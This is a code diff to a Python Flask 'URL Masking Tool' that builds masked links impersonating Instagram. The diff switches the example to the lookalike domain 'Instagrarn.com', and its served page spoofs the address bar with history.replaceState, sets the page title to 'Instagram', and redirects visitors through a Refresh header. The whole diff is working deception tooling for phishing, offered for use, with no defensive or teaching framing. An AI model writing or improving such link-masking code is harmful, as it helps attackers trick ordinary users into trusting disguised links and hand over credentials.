@@ -1,4 +1,4 @@
-from flask import Flask, request, render_template_string, redirect
+from flask import Flask, request, render_template_string, redirect, make_response
 import random
 import string
 import threading
@@ -40,7 +40,7 @@ def display_banner():
           ██║   ██║██╔██╗ ██║██║  ██║██║     ██║  ███╗█████╗  ██████╔╝
           ██║   ██║██║╚██╗██║██║  ██║██║     ██║   ██║██╔══╝  ██╔══██╗
           ╚██████╔╝██║ ╚████║██████╔╝███████╗╚██████╔╝███████╗██║  ██║
-           ╚════╝ ╚═╝  ╚═══╝╚═════╝ ╚══════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝
+           ╚═════╝ ╚═╝  ╚═══╝╚═════╝ ╚══════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝
 
             URL Masking Tool (Version 3.0)
           Created by [Your Name Here]
@@ -62,7 +62,7 @@ def mask_url(public_url):
     display_banner()
     print("\n\033[92m[+]\033[0m Enter the Original URL (e.g., http://instagram.com):")
     original_url = input("\033[93m> \033[0m").strip()
-    print("\n\033[92m[+]\033[0m Enter the Fake URL (e.g., http://Instagram.com):")
+    print("\n\033[92m[+]\033[0m Enter the Fake URL (e.g., http://Instagrarn.com):")
     fake_url = input("\033[93m> \033[0m").strip()
 
     if not original_url.startswith(('http://', 'https://')):
@@ -82,40 +82,46 @@ def mask_url(public_url):
 @app.route('/<path:random_path>')
 def fake_page(random_path):
     if random_path in url_mapping:
-        fake_url = "http://Instagram.com"  # You can dynamically set this based on your logic
-        return render_template_string(f'''
+        response = make_response(render_template_string('''
 <!DOCTYPE html>
 <html>
 <head>
-    <title>{fake_url}</title>
-    <meta http-equiv="refresh" content="2; url={url_mapping[random_path]}">
+    <title>Loading...</title>
     <style>
-        body {{
+        body {
             font-family: Arial, sans-serif;
+            background-color: white;
             margin: 0;
             padding: 0;
-        }}
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .loader {
+            width: 40px;
+            height: 40px;
+            border: 4px solid rgba(0, 0, 0, 0.1);
+            border-radius: 50%;
+            border-top-color: #333;
+            animation: spin 1s ease-in-out infinite;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
     </style>
     <script>
-        document.title = "{fake_url}";
-        if (window.history.replaceState) {{
-            window.history.replaceState(null, null, "{fake_url}");
-        }}
+        window.history.replaceState({}, document.title, "http://Instagrarn.com");
+        document.title = "Instagram";
     </script>
 </head>
 <body>
-    <div style="text-align: center; margin-top: 200px;">
-        <div style="width: 40px; height: 40px; border: 4px solid rgba(0, 0, 0, 0.1); border-radius: 50%; border-top-color: #333; animation: spin 1s ease-in-out infinite; margin: 0 auto;"></div>
-        <p style="margin-top: 20px; color: #333;">Loading...</p>
-    </div>
-    <style>
-        @keyframes spin {{
-            to {{ transform: rotate(360deg); }}
-        }}
-    </style>
+    <div class="loader"></div>
 </body>
 </html>
-''')
+'''))
+        response.headers['Refresh'] = f'2; url={url_mapping[random_path]}'
+        return response
     return "URL not found or expired.", 404
 
 def main_menu(public_url):
